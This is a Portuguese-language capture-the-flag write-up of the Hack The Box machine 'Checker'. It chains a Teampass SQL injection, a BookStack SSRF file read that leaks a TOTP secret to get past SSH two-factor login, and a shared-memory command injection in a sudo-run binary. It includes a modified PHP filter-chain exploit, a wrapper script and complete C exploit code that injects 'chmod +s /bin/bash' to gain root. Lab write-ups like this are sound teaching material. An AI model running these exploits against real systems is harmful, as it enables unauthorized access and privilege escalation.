# Checker

## Resumo

Essa máquina expõe duas aplicações web vulneráveis. A primeira delas que pode ser explorada é uma instância do Teampass — software de compartilhamento de senhas entre equipes — em uma versão vulnerável à SQL injection, o que permite extrair os hashes de senha dos usuários do banco de dados. Quebrando a senha do usuário bob e obtendo acesso à aplicação, é possível encontrar credenciais para o serviço SSH, porém o acesso está protegido por autenticação em dois fatores por meio de um time-based one-time password (TOTP) gerado pelo módulo do Google Authenticator que integra com o PAM. Além das credenciais para o SSH, estão presentes também as credenciais para o outro serviço em execução, o BookStack. Essa aplicação se encontra numa versão vulnerável a Local File Read (LFR) por meio de um Server-Side Request Forgery (SSRF), o que permite encontrar o segredo utilizado para gerar os códigos OTPs do usuário reader. Após o acesso inicial à máquina, foi possível encontrar um script o qual o usuário reader era capaz de executar com privilégios elevados (como sudo). Esse script chamava um binário que recebia um nome de usuário como parâmetro e realizava uma consulta ao banco de dados do Teampass para recuperar o hash de senha do usuário informado e comparar se ele existia em um arquivo local. Realizando a engenharia reversa do binário, foi possível identificar que ele consultava o valor do hash armazenado em um endereço de memória compartilhada que recebia como chave um valor aleatório, tendo como seed o timestamp de execução. Esse valor armazenado era passado para um comando da CLI do MySQL, o que resultou numa vulnerabilidade de command injection, pois foi possível injetar um código malicioso nesse espaço de memória compartilhada e encadear a execução de comandos arbitrários.

## Reconhecimento

Realizei uma varredura de portas utilizando o [Rustscan](https://rustscan.github.io/RustScan/) e o [Nmap](https://nmap.org/), e identifiquei os seguintes serviços em execução:

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQsMcD52VU4FwV2qhq65YVV9Flp7+IUAUrkugU+IiOs5ph+Rrqa4aofeBosUCIziVzTUB/vNQwODCRSTNBvdXQ=
|   256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRBr02nNGqdVIlkXK+vsFIdhcYJoWEVqAIvGCGz+nHY
80/tcp   open  http    syn-ack ttl 63 Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
8080/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As portas `80` e `8080` respondem como servidores web, o que significa que é possível acessá-los por meio de um navegador web.

### BookStack

Acessando a porta 80, fui redirecionado para o domínio `checker.htb`, sendo necessário adicionar uma entrada para resolver esse domínio no arquivo `/etc/hosts` da minha máquina:

```bash
# {IP_ALVO} representa o endereço da máquina
echo "{IP_ALVO} checker.htb" | sudo tee -a /etc/hosts
```

Dessa forma, foi possível acessar o serviço, o que revelou uma instância do [BookStack](https://www.bookstackapp.com/) — um software de documentação técnica — em execução.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>HTB Checker — instância do BookStack</p></figcaption></figure>

Realizando um [fingerprint](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server) da aplicação, identifiquei (por meio de uma das requisições capturadas pelo [Caido](https://caido.io/)) que a versão em execução era a `23.10.2`:

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>HTB Checker — versão do BookStack</p></figcaption></figure>

Depois de um tempo pesquisando, descobri que essa versão é vulnerável à [CVE-2023-6199](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/), uma vulnerabilidade de [Server-Side Request Forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) (SSRF) que pode ser escalada para uma leitura arbitrária de arquivos locais utilizando o wrapper [php://filter](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter) do PHP. Entretanto, a exploração dessa vulnerabilidade requer uma sessão autenticada, e até então não tinha obtido nenhuma credencial ou meio de acessar a aplicação. Portanto, decidi analisar o que estava em execução na porta `8080` identificada pelo Nmap.

### Teampass

Ao acessar a porta `8080` da máquina pelo navegador, o resultado foi uma instância do [Teampass](https://teampass.net/) — uma aplicação para compartilhamento de senhas entre equipes:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>HTB Checker — Teampass</p></figcaption></figure>

Realizando uma breve pesquisa sobre essa aplicação, foi possível encontrar uma vulnerabilidade de [SQL injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection) que permite extrair os hashes de senha do banco de dados da aplicação. Essa vulnerabilidade é identificada como [CVE-2023-1545](https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2) e foi possível encontrar uma [prova de conceito](https://github.com/HarshRajSinghania/CVE-2023-1545-Exploit) disponível publicamente no GitHub.

## Exploração

Executando a PoC, foi possível extrair os hashes do banco de dados dos usuários `admin` e `bob`:

```bash
bash exploit.sh 'http://checker.htb:8080'
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>HTB Checker — Dump do banco de dados do Teampass</p></figcaption></figure>

Utilizando o [john](https://github.com/openwall/john), foi possível quebrar o hash de senha do usuário bob e obter as credencias de acesso dele. Com as credenciais do usuário bob, foi possível autenticar no Teampass e encontrar mais duas credenciais:

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>HTB Checker — credenciais no Teampass</p></figcaption></figure>

A primeira senha permite acesso à instância do BookStack citada anteriormente como usuário `bob@checker.htb`, e a segunda permite autenticar na máquina via SSH. Entretanto, ao inserir a senha, é solicitado um código de autenticação em duas etapas:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption><p>HTB Checker — autenticação em duas etapas</p></figcaption></figure>

Pesquisando por esse prompt, identifiquei que se tratava do prompt padrão quando se utiliza o [google-authenticator-libpam](https://github.com/google/google-authenticator-libpam) como módulo do [PAM](https://www.redhat.com/en/blog/pluggable-authentication-modules-pam). Entretanto, é necessário o segredo que está sendo utilizado para gerar o código. Na documentação dessa biblioteca, é informado que o segredo fica armazenado no diretório `home` do usuário que tem a autenticação em 2 fatores ativada. Com isso, tentei reproduzir a vulnerabilidade do BookStack para tentar obter o conteúdo desse arquivo e conseguir me autenticar como usuário `reader`. Foram necessárias algumas alterações para que o exploit [php\_filters\_chains\_oracle\_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) tivesse sucesso:

<pre class="language-git" data-title="requestor.py" data-line-numbers><code class="lang-git">diff --git a/filters_chain_oracle/core/requestor.py b/filters_chain_oracle/core/requestor.py
index 6b17fc4..be200a8 100644
--- a/filters_chain_oracle/core/requestor.py
+++ b/filters_chain_oracle/core/requestor.py
@@ -1,6 +1,7 @@
 import json
 import requests
 import time
+from base64 import urlsafe_b64encode
 from filters_chain_oracle.core.verb import Verb
 from filters_chain_oracle.core.utils import merge_dicts
 import re
@@ -105,30 +106,34 @@ class Requestor:
             time.sleep(self.delay)
 
         filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
+        # O payload deve ser passado como o atributo `src` de uma tag `img`
<strong>+        filter_chain = f"&#x3C;img src='data:image/png;base64,{urlsafe_b64encode(filter_chain.encode()).decode()}'>"
</strong>         # DEBUG print(filter_chain)
         merged_data = self.parse_parameter(filter_chain)
         # Make the request, the verb and data encoding is defined
         try:
             if self.verb == Verb.GET:
                 requ = self.session.get(self.target, params=merged_data)
-                return requ
             elif self.verb == Verb.PUT:
                 if self.json_input: 
                     requ = self.session.put(self.target, json=merged_data)
                 else:
                     requ = self.session.put(self.target, data=merged_data)
-                return requ
             elif self.verb == Verb.DELETE:
                 if self.json_input:
                     requ = self.session.delete(self.target, json=merged_data)
                 else:
                     requ = self.session.delete(self.target, data=merged_data)
-                return requ
             elif self.verb == Verb.POST:
                 if self.json_input:
                     requ = self.session.post(self.target, json=merged_data)
                 else:
                     requ = self.session.post(self.target, data=merged_data)
+            # Necessário para evitar que o script seja interrompido ao atingir o rate-limit
+            if requ.status_code == 429:
+                time.sleep(4)
+                return self.req_with_response(s)
+            else:
                 return requ
         except requests.exceptions.ConnectionError :
             print("[-] Could not instantiate a connection")
@@ -151,4 +156,4 @@ class Requestor:
             return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
         
         # DEBUG print("CODE", requ.status_code == 500)
-        return requ.status_code == 500
\ No newline at end of file
+        return requ.status_code == 500
</code></pre>

Como o exploit foi construído de maneira que seu comportamento pudesse ser alterado por meio dos parâmetros, foram necessárias poucas alterações. Vale ressaltar que foi necessário contornar o rate-limiter do servidor, o qual bloqueava conexões assim que um número indeterminado de requisições fossem enviadas ao servidor num breve período de tempo. Feitas as devidas alterações no código, restou manipular os parâmetros do script para que o exploit fosse bem sucedido. Depois de inúmeros testes, percebi que são necessárias as seguintes condições para que o exploit funcione:

* é necessário criar um livro, e então criar uma página dentro desse livro;
* interceptando a requisição de criação de página, é possível obter o parâmetro `token` enviado na requisição e um `cookie` de sessão autenticada;
* no exploit, a requisição deve ser do tipo `POST` para a rota `/books/{nome_livro}/page/{nome_pagina}`, alterando `{nome_livro}` e `{nome_pagina}` para o nome do livro e o nome da página criados, respectivamente;
* o parâmetro em que o payload será injetado é o parâmetro `html`;
* é necessário informar todos os outros dados da rota de criação de páginas no exploit.

Com essas informações, criei um shell script para facilitar a reprodução do exploit e permitir ler múltiplos arquivos alterando apenas um parâmetro no comando:

{% code title="exploit.sh" lineNumbers="true" %}
```bash
#!/bin/bash

if [ "${#}" -ne 3 ]; then
  echo "Usage: ${0} <token> <cookie> <file>"
  exit 1
fi

TOKEN="${1}"
COOKIE="${2}"
FILE="${3}"
DATA="{\"name\":\"POC\",\"_token\":\"${TOKEN}\",\"_method\":\"PUT\",\"summary\":\"\",\"tags[0][name]\":\"\",\"tags[0][value]\":\"\",\"tags[randrowid][name]\":\"\",\"tags[randrowid][value]\":\"\",\"template-search\":\"\"}"
HEADERS="{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Cookie\":\"bookstack_session=${COOKIE}\"}"

python3 ./filters_chain_oracle_exploit.py \
  --target="http://checker.htb/books/lfr/page/poc" \
  --file="${3}" \
  --verb="POST" \
  --delay=0 \
  --data="${DATA}" \
  --parameter=html \
  --log=output.log \
  --match='An unknown error occurred' \
  --proxy='http://127.0.0.1:8080' \
  --headers="${HEADERS}"
```
{% endcode %}

Com isso, tentei ler o arquivo `/etc/hosts` e, embora seja um processo demorado, obtive sucesso. Então, tentei ler o arquivo `.google_authenticator` no diretório `home` do usuário `reader`, onde fica armazenado o segredo para geração dos códigos OTP do usuário. Entretanto, ao que tudo indica, o usuário que está executando o serviço web não tem acesso a esse diretório. Depois de muitas tentativas falhas de obter informações sensíveis com essa vulnerabilidade, voltei para a página do BookStack e me atentei a um tutorial sobre como realizar backups no Linux por meio do comando `cp`:

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>HTB Checker — artigo sobre backup</p></figcaption></figure>

No artigo, são exemplificados scripts de backup utilizando o comando `cp`. Nos exemplos, é mencionado um diretório em que é transferida uma cópia do diretório `/home`. Ao prefixar esse caminho do backup ao caminho do diretório em que deveria estar presente o arquivo `.google_authenticator` do usuário `reader`, é possível obter o segredo para geração do código OTP:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>HTB Checker — segredo para geração de código OTP</p></figcaption></figure>

Com o segredo, utilizei a ferramenta [oathtool](https://www.nongnu.org/oath-toolkit/oathtool.1.html) para gerar um código OTP e autenticar como usuário reader:

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>HTB Checker — acesso remoto via SSH como usuário reader</p></figcaption></figure>

## Pós exploração

Após acessar a máquina, executei o comando `sudo -l` e identifiquei que o usuário `reader` poderia executar o seguinte comando como `sudo`:

```bash
User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

Lendo o conteúdo do arquivo `check-leak.sh`, identifiquei que se tratava de um script que executava um binário de mesmo nome:

{% code title="/opt/hash-checker/check-leak.sh" %}
```bash
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"
```
{% endcode %}

Executei esse comando algumas vezes para avaliar seu comportamento, e identifiquei que, de maneira geral, ele apenas recebia um nome de usuário e buscava em alguma fonte se o hash de senha desse usuário tinha sido exposto em algum momento. Baixei esse arquivo para minha máquina, importei ele no Ghidra e fiz uma análise estática para realizar engenharia reversa.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption><p>HTB Checker — fluxo da aplicação</p></figcaption></figure>

Note as linhas destacadas. O fluxo da aplicação é o seguinte: caso o nome de usuário não seja vazio e seja menor que 20 caracteres, ele vai buscar pelo hash de senha do usuário no banco de dados do Teampass. Caso ele encontre, irá buscar por esse hash num arquivo local `leaked_hashes.txt`. Se o hash estiver presente nesse arquivo, a aplicação irá chamar uma função que aloca um endereço de memória compartilhada tendo como chave um valor aleatório que utiliza como seed o timestamp em que a aplicação foi executada e retorna o endereço à saída padrão por meio do `printf`. Após isso, é aplicado um delay de 1 segundo e chamada a função `notify_user`, que por sua vez utiliza o conteúdo armazenado no espaço de memória compartilhada para executar um comando do sistema:

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>HTB Checker - função vulnerável à injeção de comandos</p></figcaption></figure>

Essa função é vulnerável a [command injection](https://owasp.org/www-community/attacks/Command_Injection), pois é possível sobrescrever o conteúdo da memória compartilhada injetar um outro comando para ser executado. Devido às várias instruções que validam o conteúdo armazenado na memória compartilhada, decidi criar um binário em C que, ao ser executado, segue a mesma lógica da aplicação para criar uma chave de acesso à memória compartilhada, e então aguarda por 1 segundo para ler o conteúdo armazenado e me retornar. Com isso, executei o binário junto do comando, separando-os pelo operador `&` para que meu binário fosse executado em plano de fundo. O resultado foi o seguinte:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>HTB Checker — conteúdo armazenado na memória compartilhada</p></figcaption></figure>

Perceba que o meu binário retornou o conteúdo armazenado na memória compartilhada. Como nas análises anteriores foi possível identificar que o valor do hash era passado ao comando `mysql`, decidi copiar a primeira porção da string e injetar o comando no lugar do hash, de forma que ele pudesse ser executado logo após o comando `mysql`. Dessa forma, é possível encadear os comandos e obter uma execução de comandos de forma privilegiada. O exploit final ficou da seguinte forma:

{% code title="shm-exploit.c" lineNumbers="true" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>

#define SHM_SIZE 1024
#define SHM_MODE 0x3B6

key_t get_key() {
  int timestamp = time(NULL);
  srand((unsigned int) timestamp);
  key_t key = rand() % 0xfffff;
  printf("[+] Generated key: 0x%X\n", key);
  return key;
}

int main(int argc, char *argv[]) {
  // Get the shared memory segment
  key_t key = get_key();
  int shmid = shmget(key, SHM_SIZE, IPC_CREAT | SHM_MODE);
  if (shmid == -1) {
    perror("shmget");
    exit(EXIT_FAILURE);
  }

  // Attach the shared memory segment
  char *data = shmat(shmid, NULL, 0);
  if (data == (char *) -1) {
    perror("shmat");
    exit(EXIT_FAILURE);
  }

  // Copy the command to the shared memory segment
  // mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw = \"-> injection occurs here %s <-\"\'
  const char *command = "chmod +s /bin/bash";

  sleep(1);
  snprintf(data, SHM_SIZE, "Leaked hash detected at Thu Feb 27 16:00:20 2025 > \"';%s;#", command);
  printf("[+] Shared memory data: %s\n", data);

  if (shmdt(data) == -1) {
    perror("shmdt");
    exit(EXIT_FAILURE);
  }

  return 0;
}
```
{% endcode %}

Agora, basta apenas baixar o arquivo à máquina, adicionar a permissão de execução e executar em conjunto com o comando privilegiado, separando-os por `&` para que o exploit execute em background e aguarde até que possa sobrescrever o conteúdo na memória compartilhada.

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>HTB Checker — acesso como root</p></figcaption></figure>
